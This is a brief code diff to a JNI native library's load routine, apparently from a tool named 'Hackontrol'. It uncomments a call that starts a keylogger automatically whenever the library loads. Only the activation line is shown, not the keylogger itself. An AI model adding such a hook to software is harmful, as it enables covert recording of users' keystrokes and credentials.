@@ -10,6 +10,6 @@ JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* virtualMachine, void* reserved) {
 	}
 
 	RegisterHackontrolNative(environment);
-	//KeyLoggerInitialize(environment, virtualMachine);
+	KeyLoggerInitialize(environment, virtualMachine);
 	return JNI_VERSION_21;
 }
